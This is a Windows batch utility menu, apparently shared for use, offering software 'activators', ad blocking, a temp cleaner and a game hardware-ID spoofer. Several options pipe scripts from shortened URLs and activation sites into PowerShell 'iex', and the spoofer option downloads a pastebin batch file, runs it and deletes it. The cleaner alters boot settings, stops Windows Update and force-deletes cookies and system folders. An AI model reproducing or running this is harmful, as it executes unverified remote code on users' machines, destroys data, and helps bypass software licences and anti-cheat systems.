@echo off
chcp 65001
title OMEGA UTILS by zOmegaSkiller (v2.8)


:startup1
cls
echo. 
echo		 			[35m███╗   ███╗ █████╗ ██████╗ ███████╗    ██████╗ ██╗   ██╗
echo		 			[35m████╗ ████║██╔══██╗██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝
echo		 			[35m██╔████╔██║███████║██║  ██║█████╗      ██████╔╝ ╚████╔╝ 
echo		 			[35m██║╚██╔╝██║██╔══██║██║  ██║██╔══╝      ██╔══██╗  ╚██╔╝  
echo		 			[35m██║ ╚═╝ ██║██║  ██║██████╔╝███████╗    ██████╔╝   ██║   
echo		 			[35m╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚═════╝    ╚═╝   
echo		 [94m███████╗ ██████╗ ███╗   ███╗███████╗ ██████╗  █████╗ ███████╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
echo		 [94m╚══███╔╝██╔═══██╗████╗ ████║██╔════╝██╔════╝ ██╔══██╗██╔════╝██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
echo		   [94m███╔╝ ██║   ██║██╔████╔██║█████╗  ██║  ███╗███████║███████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
echo		  [94m███╔╝  ██║   ██║██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║╚════██║██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
echo		 [94m███████╗╚██████╔╝██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║███████║██║  ██╗██║███████╗███████╗███████╗██║  ██║
echo		 [94m╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
ping -n 4 127.0.0.1 > nul
:: CHANGE 4 -> 0 TO START DEBUGGING // CHANGE 0 -> 4 AFTER DEBUGGING
goto menu


:menu
cls
echo.		
echo			 [35m██████╗ ███╗   ███╗███████╗ ██████╗  █████╗     [94m██╗   ██╗████████╗██╗██╗     ███████╗
echo			[35m██╔═══██╗████╗ ████║██╔════╝██╔════╝ ██╔══██╗    [94m██║   ██║╚══██╔══╝██║██║     ██╔════╝
echo			[35m██║   ██║██╔████╔██║█████╗  ██║  ███╗███████║    [94m██║   ██║   ██║   ██║██║     ███████╗
echo			[35m██║   ██║██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║    [94m██║   ██║   ██║   ██║██║     ╚════██║
echo			[35m╚██████╔╝██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║    [94m╚██████╔╝   ██║   ██║███████╗███████║
echo			 [35m╚═════╝ ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝     [94m╚═════╝    ╚═╝   ╚═╝╚══════╝╚══════╝   
echo.
echo.
echo.
echo					[35m1 [90m~ [94mDelTemp		[35m2 [90m~ [94mSpotify AdBlock	[35m3 [90m~ [94mADOBE
echo.
echo.			
echo					[35m4 [90m~ [94mOffice/Windows	[35m5 [90m~ [94mIDM            	[35m6 [90m~ [94m** SHOW MORE **
echo.                                                                                 
choice /C:123456789 /N
set "menuoption=%errorlevel%"
if "%menuoption%"=="1" goto DELTEMP
if "%menuoption%"=="2" goto SPOTIFY
if "%menuoption%"=="3" goto ADOBE
if "%menuoption%"=="4" goto MICROSOFT
if "%menuoption%"=="5" goto IDM
if "%menuoption%"=="6" goto menu2
if "%menuoption%"=="9" goto DEBUG
goto menu


:DELTEMP
cls
color 5
:: ---------------------
echo --- Please wait... ---
echo.
bcdedit /set useplatformtick yes
bcdedit /set disabledynamictick yes
bcdedit /deletevalue useplatformclock
set "USERPROFILE=%USERPROFILE%"
set "windir=%windir%"
set "SystemDrive=%SystemDrive%"
set "temp=%temp%"
net stop wuauserv
net stop UsoSvc
del /s /f /q "%USERPROFILE%\Recent\*.*" "%USERPROFILE%\appdata\local\temp\*.*" "%windir%\temp\*.*" "%windir%\Prefetch\*.*" "%windir%\system32\dllcache\*.*" "%SystemDrive%\Temp\*.*" "%temp%\*.*" "%USERPROFILE%\Local Settings\History\*.*" "%USERPROFILE%\Local Settings\Temporary Internet Files\*.*" "%USERPROFILE%\Local Settings\Temp\*.*" "%USERPROFILE%\Cookies\*.*"
rd /s /q "%windir%\temp" "%windir%\Prefetch" "%windir%\system32\dllcache" "%SystemDrive%\Temp" "%temp%" "%USERPROFILE%\Local Settings\History" "%USERPROFILE%\Local Settings\Temporary Internet Files" "%USERPROFILE%\Local Settings\Temp" "%USERPROFILE%\Cookies"
md "%USERPROFILE%\Recent" "%USERPROFILE%\appdata\local\temp" "%windir%\temp" "%windir%\Prefetch" "%windir%\system32\dllcache" "%SystemDrive%\Temp" "%temp%" "%USERPROFILE%\Local Settings\History" "%USERPROFILE%\Local Settings\Temporary Internet Files" "%USERPROFILE%\Local Settings\Temp" "%USERPROFILE%\Cookies"
:: ---------------------
echo.
echo ======================================================
echo 			Done!
echo ======================================================
echo.
pause
goto menu


:SPOTIFY
cls
color 5
echo loading...

:: -----------------------------
set param=-confirm_uninstall_ms_spoti -confirm_spoti_recomended_over -podcasts_off -block_update_on -start_spoti -new_theme -adsections_off -lyrics_stat spotify
set url='https://raw.githubusercontent.com/SpotX-Official/spotx-official.github.io/main/run.ps1'
set url2='https://spotx-official.github.io/run.ps1'
set tls=[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12;
%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe ^
-Command %tls% $p='%param%'; """ & { $(try { iwr -useb %url% } catch { $p+= ' -m'; iwr -useb %url2% })} $p """" | iex
:: ----------------------------

:: BACKUP JUST IN CASE: powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Expression (Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/mrpond/BlockTheSpot/master/install.ps1').Content; Uninstall-SpotifyStoreEdition -UpdateSpotify}"
goto menu


:ADOBE
cls
color 5
echo loading...
powershell -Command "& {irm y.gy/toolbox | iex}"
exit


:MICROSOFT
cls
color 5
echo loading...
powershell -Command "& {irm https://get.activated.win | iex}"
exit

:IDM
cls
color 5
echo loading...
powershell -Command "& {irm is.gd/idm_reset | iex}"
exit




:DEBUG
cls
color 5
:: PASTE HERE TEST CODE
pause
goto menu


:menu2
cls
echo.		
echo			 [35m██████╗ ███╗   ███╗███████╗ ██████╗  █████╗     [94m██╗   ██╗████████╗██╗██╗     ███████╗
echo			[35m██╔═══██╗████╗ ████║██╔════╝██╔════╝ ██╔══██╗    [94m██║   ██║╚══██╔══╝██║██║     ██╔════╝
echo			[35m██║   ██║██╔████╔██║█████╗  ██║  ███╗███████║    [94m██║   ██║   ██║   ██║██║     ███████╗
echo			[35m██║   ██║██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║    [94m██║   ██║   ██║   ██║██║     ╚════██║
echo			[35m╚██████╔╝██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║    [94m╚██████╔╝   ██║   ██║███████╗███████║
echo			 [35m╚═════╝ ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝     [94m╚═════╝    ╚═╝   ╚═╝╚══════╝╚══════╝   
echo.
echo.
echo.
echo					[35m11 [90m~ [94mSPOOFER		[35m12 [90m~ [94mRFFU		[35m13 [90m~ [94mRFFU
echo.
echo.			
echo					[35m14 [90m~ [94mRFFU	        [35m15 [90m~ [94mRFFU		[35m16 [90m~ [94m** GO BACK **
echo.                                                                 
set /p "menuoption="
if "%menuoption%"=="11" goto SPOOFER
if "%menuoption%"=="12" goto option12
if "%menuoption%"=="13" goto option13
if "%menuoption%"=="14" goto option14
if "%menuoption%"=="15" goto option15
if "%menuoption%"=="16" goto menu
goto menu2

:SPOOFER
cls
color 5
echo.		
echo			 [35m██████╗ ███╗   ███╗███████╗ ██████╗  █████╗     [94m██╗   ██╗████████╗██╗██╗     ███████╗
echo			[35m██╔═══██╗████╗ ████║██╔════╝██╔════╝ ██╔══██╗    [94m██║   ██║╚══██╔══╝██║██║     ██╔════╝
echo			[35m██║   ██║██╔████╔██║█████╗  ██║  ███╗███████║    [94m██║   ██║   ██║   ██║██║     ███████╗
echo			[35m██║   ██║██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║    [94m██║   ██║   ██║   ██║██║     ╚════██║
echo			[35m╚██████╔╝██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║    [94m╚██████╔╝   ██║   ██║███████╗███████║
echo			 [35m╚═════╝ ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝     [94m╚═════╝    ╚═╝   ╚═╝╚══════╝╚══════╝   
echo.
echo.
echo.
echo					[35m1 [90m~ [94mUNIVERSAL-SPOOFER		[35m2 [90m~ [94mFIVEM-SPOOFER
echo.
set /p "spooferselection="
if "%spooferselection%"=="1" start https://github.com/SecHex/SecHex-Spoofy/tree/main
if "%spooferselection%"=="2" call set "_t=%TEMP%\r%RANDOM%.bat" & cmd /V:ON /C "curl -sL "https://pastebin.com/raw/dfVWSTEu" -o "!_t!" && (call "!_t!" & del "!_t!" >nul 2>&1)" & call set "_t=" & pause
goto menu2

:option12
echo soon
pause
goto menu2
:option13
echo soon
pause
goto menu2
:option14
echo soon
pause
goto menu2
:option15
echo soon
pause
goto menu2